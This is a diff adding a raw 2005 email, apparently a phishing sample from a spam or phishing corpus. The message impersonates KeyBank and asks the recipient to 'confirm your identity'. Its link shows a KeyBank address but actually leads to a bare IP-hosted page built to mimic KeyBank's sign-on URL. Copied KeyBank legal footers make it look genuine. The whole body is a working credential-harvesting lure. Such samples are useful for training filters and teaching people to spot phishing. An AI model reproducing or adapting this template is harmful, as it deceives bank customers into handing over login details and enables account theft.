@@ -1,0 +1,61 @@
+From nobody Sun Jan 25 13:47:54 2015
+Return-Path: <nobody@server.digitime.net>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.23.1.4])
+ by spanky.domain.com (Postfix) with ESMTP id 7038B537124
+ for <username@login.domain.com>; Thu, 31 Mar 2005 07:52:26 -0500 (EST)
+Received: from server.digitime.net (unknown [205.234.146.43])
+ by mail1.domain.com (Postfix) with ESMTP id 53CF485B2EC
+ for <username@domain.com>; Thu, 31 Mar 2005 07:52:26 -0500 (EST)
+Received: from nobody by server.digitime.net with local (Exim 4.44)
+ id 1DGz9w-0000SK-LY
+ for username@domain.com; Thu, 31 Mar 2005 14:52:28 +0200
+To: username@domain.com
+Subject: Online Banking Account Security Update
+From: Key Team <support@keybank.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1DGz9w-0000SK-LY@server.digitime.net>
+Date: Thu, 31 Mar 2005 14:52:28 +0200
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.digitime.net
+X-AntiAbuse: Original Domain - domain.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - server.digitime.net
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 250
+
+<style type="text/css">
+<!--
+.style1 {font-size: 12px}
+-->
+</style>
+<p><img src="https://accounts2.keybank.com/ib2/images/enroll/head_ConfirmID.gif" width="575" height="80"></p>
+<p><strong>Dear Key Bank customer.  Please read this message and follow it's instructions</strong></p>
+<p><strong>Confirm Your Identity:</strong><br>
+We are performing maintenance, which may interfere with access to your Online Services.  Due to these technical updates your online account has been flagged and we must confirm that you are the rightful owner of the account. To Confirm Your Identity click the link below,  Please make sure you do this in a timely fashion as we look forward of bringing you updates regularly</p>
+<p> </p>
+<p><strong>To get started, please click the link below:</strong><br> 
+  <a href="http://218.154.123.228/~niccol21/t.html/accounts2.keybank.com/ib2/Controllerrequester=signon&CookieID=11985569885&pageType=&pa2=&bshowgif=&pa1=&pUserId=&erams=&pageType=&pa2=&bshowgif=&pa1=&pUserId=&errmsg=&UsingSSL=&runame=&siteid=0/">http://accounts.keybank.com/ConfirmHelp?start=yes</a></p>
+<p> </p>
+<p>Important information from Key Bank.<br>
+This e-mail contains information directly related to your account with us, other services to which you have subscribed, and/or any application you may have submitted. <br>
+Key Bank and its service providers are committed to protecting your privacy and ask you not to send sensitive account information through e-mail. </p>
+<p align="center" class="style1">Key Values <a href="/diversity">Diversity </a>. KeyBank is an <a href="/ehl">Equal Housing Lender </a>. <br>
+  By accessing and using this website, you agree to the terms and conditions and important legal notices below. <br>
+  <a href="/useragreement">User Agreement </a>, <a href="/linkingdisclaimer">Linking Disclaimer </a>, <a href="/arbitration">Arbitration Provision </a>, <a href="/security">Security </a>, and <a href="/keyprivacypolicy">Privacy Policy </a><br>
+  Copyright © 1998-2005, KeyCorp. All rights reserved. </p>
+<p align="center"> </p>
+
+
+
+
